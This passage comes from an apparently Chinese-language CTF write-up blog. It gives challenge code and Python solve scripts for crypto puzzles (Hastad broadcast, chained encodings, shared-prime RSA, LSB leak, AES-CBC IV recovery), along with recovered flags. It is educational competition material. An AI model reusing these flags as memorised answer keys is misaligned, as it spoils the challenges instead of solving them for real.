gmpy2.iroot(m_e,e)  <span class="comment"># m^e 开e次根</span></span><br><span class="line"><span class="comment"># print(&#x27;e = %d&#x27;%e)</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;H0w_Fun_13_HAstads_broadca5t_AtTack!&#125;\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="鹤城杯-2021-A-CRYPTO"><a href="#鹤城杯-2021-A-CRYPTO" class="headerlink" title="[鹤城杯 2021]A_CRYPTO"></a>[鹤城杯 2021]A_CRYPTO</h1><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><p>4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35rot47 解码得到</p>
<p>c<del>dhdhdcchc”bad<code>d_cebacfdfdhd&#125;dbc#dac</code>dedbbbcbdfcfc#c}dfdhdddcc#c</del>d}c”cecbc$c<del>dhcfcadbcec”d}ccc#c”d`bbcddfdac</del>d}c$cachcccfbdcaddc<del>dhd}ccdbc</del>bac#chdedfced`ddbacec<del>chbcdechdec</del>cec#c#chcdcbd_c}bd</p>
<p>这里rot47不行 需要用rot13解码</p>
<h3 id="WP-3"><a href="#WP-3" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">&#x27;4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35&#x27;</span></span><br><span class="line">rot13cipher = <span class="string">&#x27;4B595954494D32515046324757595A534E52415653334357474E4A575955544E4B5A4D46434F4B59474253464D5A444E4D51334557524B5A4F424944473542554B595A44534B324E49565746515532464B49345649564B464E4E494543504A35&#x27;</span></span><br><span class="line">rot47cipher = <span class="string">&#x27;c~dhdhdcchc&quot;bad`d_cebacfdfdhd&#125;dbc#dac`dedbbbcbdfcfc#c&#125;dfdhdddcc#c~d&#125;c&quot;cecbc$c~dhcfcadbcec&quot;d&#125;ccc#c&quot;d`bbcddfdac~d&#125;c$cachcccfbdcaddc~dhd&#125;ccdbc~bac#chdedfced`ddbacec~chbcdechdec~cec#c#chcdcbd_c&#125;bd&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(base64.b16decode(rot13cipher))</span><br><span class="line"><span class="comment"># KYYTIM2QPF2GWYZSNRAVS3CWGNJWYUTNKZMFCOKYGBSFMZDNMQ3EWRKZOBIDG5BUKYZDSK2NIVWFQU2FKI4VIVKFNNIECPJ5</span></span><br><span class="line"><span class="built_in">print</span>(base64.b32decode(base64.b16decode(rot13cipher)))</span><br><span class="line"><span class="comment"># b&#x27;V143Pytkc2lAYlV3SlRmVXQ9X0dVdmd6KEYpP3t4V29+MElXSER9TUEkPA==&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(base64.b32decode(base64.b16decode(rot13cipher))))</span><br><span class="line"><span class="comment"># b&#x27;W^7?+dsi@bUwJTfUt=_GUvgz(F)?&#123;xWo~0IWHD&#125;MA$&lt;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b85decode(base64.b64decode(base64.b32decode(base64.b16decode(rot13cipher)))))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;W0w_y0u_c4n_rea11y_enc0d1ng!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="鹤城杯-2021-easy-crypto"><a href="#鹤城杯-2021-easy-crypto" class="headerlink" title="[鹤城杯 2021]easy_crypto"></a>[鹤城杯 2021]easy_crypto</h1><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><p>公正公正公正诚信文明公正民主公正法治法治诚信民主自由敬业公正友善公正平等平等法治民主平等平等和谐敬业自由诚信平等和谐平等公正法治法治平等平等爱国和谐公正平等敬业公正敬业自由敬业平等自由法治和谐平等文明自由诚信自由平等富强公正敬业平等民主公正诚信和谐公正文明公正爱国自由诚信自由平等文明公正诚信富强自由法治法治平等平等自由平等富强法治诚信和谐</p>
<h3 id="WP-4"><a href="#WP-4" class="headerlink" title="WP"></a>WP</h3><p><a href="https://atool.vip/corevalue/">https://atool.vip/corevalue/</a> 社会主义核心价值观编码 直接接触flag</p>
<p>flag{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}</p>
<h1 id="羊城杯-2022-EasyRsa-【共享素数】"><a href="#羊城杯-2022-EasyRsa-【共享素数】" class="headerlink" title="[羊城杯 2022]EasyRsa 【共享素数】"></a>[羊城杯 2022]EasyRsa 【共享素数】</h1><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m = c</span><br><span class="line"> </span><br><span class="line"><span class="comment"># c1  m1=c1</span></span><br><span class="line"><span class="comment"># c2 = pow(c1,e,n)</span></span><br><span class="line"><span class="comment"># ci = pow(ci-1,e,n)</span></span><br><span class="line"><span class="comment"># 每次取文本中的数作为 加密的模数</span></span><br><span class="line"><span class="comment"># 每次得到的密文会作为下一次的明文进行加密</span></span><br><span class="line"><span class="comment"># 也就可以理解为 连续加密了len(a)遍 每次都用不同的模数</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 已知最后一次加密的密文 c  最后一次加密的模数n  指数e</span></span><br><span class="line"><span class="comment"># 使用多组模数 可以有限考虑 模数共用素因子</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = %s&#x27;</span> % (m)</span><br><span class="line">f.close()</span><br><span class="line"> </span><br><span class="line">c = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="number">65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619</span></span><br><span class="line"><span class="number">86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499</span></span><br><span class="line"><span class="number">57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547</span></span><br><span class="line"><span class="number">52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269</span></span><br><span class="line"><span class="number">79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243</span></span><br><span class="line"><span class="number">73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879</span></span><br><span class="line"><span class="number">89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763</span></span><br><span class="line"><span class="number">66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643</span></span><br><span class="line"><span class="number">79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213</span></span><br><span class="line"><span class="number">70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189</span></span><br><span class="line"><span class="number">51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663</span></span><br><span class="line"><span class="number">87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919</span></span><br></pre></td></tr></table></figure>



<h3 id="WP-5"><a href="#WP-5" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    n_list = fp.read().splitlines()</span><br><span class="line"><span class="built_in">print</span>(n_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">int</span>(n_list[<span class="number">0</span>])))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(n_list))</span><br><span class="line"> </span><br><span class="line">p = gmpy2.gcd(<span class="built_in">int</span>(n_list[<span class="number">0</span>]),<span class="built_in">int</span>(n_list[<span class="number">1</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n_list)-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.gcd(<span class="built_in">int</span>(n_list[<span class="number">0</span>]),<span class="built_in">int</span>(n_list[<span class="number">1</span>])) == p</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 存在公因数&quot;</span>,p)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> n_list[::-<span class="number">1</span>]:</span><br><span class="line">    q = <span class="built_in">int</span>(n) // p</span><br><span class="line">    d = gmpy2.invert(e,(q-<span class="number">1</span>)*(p-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,<span class="built_in">int</span>(n))</span><br><span class="line">    c = m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="zer0pts-2020-ROR"><a href="#zer0pts-2020-ROR" class="headerlink" title="[zer0pts 2020]ROR"></a>[zer0pts 2020]ROR</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line">ror = <span class="keyword">lambda</span> x, l, b: (x &gt;&gt; l) | ((x &amp; ((<span class="number">1</span>&lt;&lt;l)-<span class="number">1</span>)) &lt;&lt; (b-l))</span><br><span class="line"><span class="comment"># 循环右移   2|n  -&gt; c的最低位就是m的最低位</span></span><br><span class="line"><span class="comment"># 遍历所有的 c的最低位 合并即可得到m</span></span><br><span class="line"> </span><br><span class="line">N = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> base <span class="keyword">in</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>]:</span><br><span class="line">    N *= <span class="built_in">pow</span>(base, random.randint(<span class="number">123</span>, <span class="number">456</span>))</span><br><span class="line">    <span class="comment">#  N = 2^x * 3^y * 7^z</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 奇 * 奇 = 奇</span></span><br><span class="line">    <span class="comment"># 偶 * 偶 = 偶</span></span><br><span class="line">    <span class="comment"># 奇 * 偶 = 奇</span></span><br><span class="line">    <span class="comment"># 所以 N最终为2的倍数 为偶数 对应的最后一个二进制字符为 1</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 当A &gt; B时：</span></span><br><span class="line">    <span class="comment"># 若B为偶数，A % B的奇偶性同A的奇偶性一致</span></span><br><span class="line">    <span class="comment"># 若B为奇数，A % B的奇偶性同A的奇偶性相反</span></span><br><span class="line">    <span class="comment"># 当A &lt; B时：</span></span><br><span class="line">    <span class="comment"># A % B的奇偶性与A一致</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment"># N &gt; m   N为偶数 所以m 也就是偶数</span></span><br><span class="line">    <span class="comment"># 对应 pow(c,d,n) 也为偶数</span></span><br><span class="line">    <span class="comment"># 所以每次得到的结果中 最后一个 1bit位 和 m的最后一个bit位一样</span></span><br><span class="line">    <span class="comment"># 所以求每个C的最后一个二进制位 组合起来就是 m</span></span><br><span class="line">     </span><br><span class="line">e = random.randint(<span class="number">271828</span>, <span class="number">314159</span>)</span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; N.bit_length()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m.bit_length()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(ror(m, i, m.bit_length()), e, N))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># C =  ( ror(m,i,m.len)  ) ^e mod n</span></span><br></pre></td></tr></table></figure>

<h3 id="WP-6"><a href="#WP-6" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;chall.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">li=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    li.append(<span class="built_in">int</span>(i.strip(<span class="string">&#x27;\n&#x27;</span>)))</span><br><span class="line"><span class="comment"># print(li)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">    flag+=<span class="built_in">bin</span>(i)[-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(flag,<span class="number">2</span>)))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">eval</span>(<span class="string">&#x27;0b&#x27;</span>+flag[::-<span class="number">1</span>])))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#zer0pts&#123;0h_1t_l34ks_th3_l34st_s1gn1f1c4nt_b1t&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="2020年第三届安洵杯-easyaes"><a href="#2020年第三届安洵杯-easyaes" class="headerlink" title="[2020年第三届安洵杯] easyaes"></a>[2020年第三届安洵杯] easyaes</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">l</span>):</span><br><span class="line">    <span class="keyword">return</span> random.getrandbits(l)</span><br><span class="line"><span class="comment"># 求iv  去除掉收尾指定字符串</span></span><br><span class="line">iv = flag.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">16</span>)])</span><br><span class="line">LENGTH = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="comment"># 16字节  所以会使用16个字符或长度为16的字符串做密码</span></span><br><span class="line"><span class="keyword">assert</span> LENGTH == <span class="number">16</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#  32字节 且为4个字符(32bit)的重复  32bit*8</span></span><br><span class="line"><span class="comment"># 每个字节由 2个十六进制字符表示 所以有 32*2=64个十六机制字符</span></span><br><span class="line">hint = os.urandom(<span class="number">4</span>) * <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(hint)^bytes_to_long(key))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64 / 16 =4</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypto</span>(<span class="params">message</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 对msg AES加密后 转十六进制后 输出后32位</span></span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(encrypto(msg))[-<span class="number">32</span>:])</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line"><span class="string">bc03f3ac4ff8064acbcfaf0b0bf2ba7b</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p><a href="http://f0und.icu/article/27.html">http://f0und.icu/article/27.html</a> 刚接触时候跟着看了下wp和解题思路学习了下</p>
<p>解密流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msg[0] = decrypt(enc1,key)^iv</span><br><span class="line">msg[1] = decrypt(enc2,key)^enc1</span><br><span class="line">msg[2] = decrypt(enc3,key)^enc2</span><br><span class="line">msg[3] = decrypt(enc4,key)^enc3</span><br><span class="line">msg = msg[0]+msg[1]+msg[2]+msg[3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iv = msg[0] ^ decrypt(enc1,key)</span><br><span class="line">enc1 = msg[1] ^ decrypt(enc2,key)</span><br><span class="line">enc2 = msg[2] ^ decrypt(enc3,key)</span><br><span class="line">enc3 = msg[3] ^ decrypt(enc4,key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">其中 已知如下：</span><br><span class="line">hint^key = tmp -&gt; key = tmp^hint </span><br><span class="line">enc4</span><br><span class="line">msg[0] msg[1] msg[2] msg[3]</span><br><span class="line">所以可以推出iv来 得到flag</span><br></pre></td></tr></table></figure>

<h3 id="WP-7"><a href="#WP-7" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> binascii, sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="comment"># -----------get key---------</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># tmp = hint ^ key -&gt; key = tmp ^ hint</span></span><br><span class="line">tmp = <span class="number">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line"><span class="comment"># hint为32字节 key为16字节  所以异或后 tmp高位就是 hint的高位</span></span><br><span class="line"><span class="comment"># [2:10] 前面有0x 所以从第二位开始取8位</span></span><br><span class="line"><span class="comment"># 32字节 64个十六进制字符</span></span><br><span class="line">hint = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(tmp))[<span class="number">2</span>:<span class="number">10</span>] * <span class="number">8</span>, <span class="number">16</span>)</span><br><span class="line">key = long_to_bytes(tmp ^ hint)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ----------get iv-----------</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line">msgs = [msg[ii:(ii + <span class="number">16</span>)] <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(msgs)</span><br><span class="line"><span class="comment"># [b&#x27;Welcome, ctfer. &#x27;, b&#x27;Dont try too har&#x27;, b&#x27;d, its no use. H&#x27;, b&#x27;ave a good day!!&#x27;]</span></span><br><span class="line"> </span><br><span class="line">msgs.reverse()</span><br><span class="line"><span class="comment"># msg[3] msg[2] msg[1] msg[0]</span></span><br><span class="line"><span class="comment"># [b&#x27;ave a good day!!&#x27;, b&#x27;d, its no use. H&#x27;, b&#x27;Dont try too har&#x27;, b&#x27;Welcome, ctfer. &#x27;]</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IV = binascii.unhexlify(<span class="string">&#x27;bc03f3ac4ff8064acbcfaf0b0bf2ba7b&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># iv = msg[0] ^ decrypt(enc1,key)</span></span><br><span class="line"><span class="comment"># enc1 = msg[1] ^ decrypt(enc2,key)</span></span><br><span class="line"><span class="comment"># enc2 = msg[2] ^ decrypt(enc3,key)</span></span><br><span class="line"><span class="comment"># enc3 = msg[3] ^ decrypt(enc4,key)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decry</span>(<span class="params">key, IV, ms</span>):</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> strxor(aes.decrypt(IV), ms)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ms <span class="keyword">in</span> msgs:</span><br><span class="line">    IV = decry(key, IV, ms)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span> + IV + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>





<h2 id="ACTF新生赛2020-crypto-aes"><a href="#ACTF新生赛2020-crypto-aes" class="headerlink" title="[ACTF新生赛2020]crypto-aes"></a>[ACTF新生赛2020]crypto-aes</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key=os.urandom(<span class="number">2</span>)*<span class="number">16</span></span><br><span class="line">    iv=os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key)^bytes_to_long(iv))</span><br><span class="line">    aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    enc_flag = aes.encrypt(FLAG)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 91144196586662942563895769614300232343026691029427747065707381728622849079757</span></span><br><span class="line"><span class="comment"># b&#x27;\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bit位  bytes字节</span><br><span class="line">1 bytes = 8bits</span><br><span class="line">1 字节 = 2个十六进制字符</span><br></pre></td></tr></table></figure>

<p>key 32bytes 256bits</p>
<p>iv 16bytes 128bits</p>
<p>key和iv 进行低128位进行异或，所以key的高128bits固定不变，所以输出结果的高128bits即 key的高128bits tmp[16:]</p>
<p>tmp = key ^ iv -&gt; iv = tmp ^ key 与key低16位异或 得到iv</p>
<p>所以可以得到key全部256bits</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">out = <span class="number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span></span><br><span class="line">tmp = long_to_bytes(out)</span><br><span class="line">key = tmp ^ iv </span><br><span class="line">iv = key ^ tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aes=AES.new(key,AES.MODE_CBC,iv) </span><br><span class="line">enc_flag = aes.encrypt(FLAG)</span><br><span class="line">需要知道 key 和 iv 就可以得到flag</span><br><span class="line"></span><br><span class="line">其中  key <span class="number">32</span>字节  iv <span class="number">16</span>字节</span><br><span class="line">已知 tmp = key ^ iv  -&gt;  iv = tmp ^ key </span><br></pre></td></tr></table></figure>

<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">xor = <span class="number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span></span><br><span class="line">tmp = long_to_bytes(xor)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"> </span><br><span class="line">enc_flag = <span class="string">b&#x27;\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p&#x27;</span></span><br><span class="line"><span class="comment"># key 为啥低16字节也是呢  key = tmp[:16]*2 ？？</span></span><br><span class="line"><span class="comment"># key=os.urandom(2)*16 前面题目给出高低16字节相同 所以直接*2即可</span></span><br><span class="line">key = tmp[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment"># iv = key^tmp</span></span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:])^bytes_to_long(tmp[<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



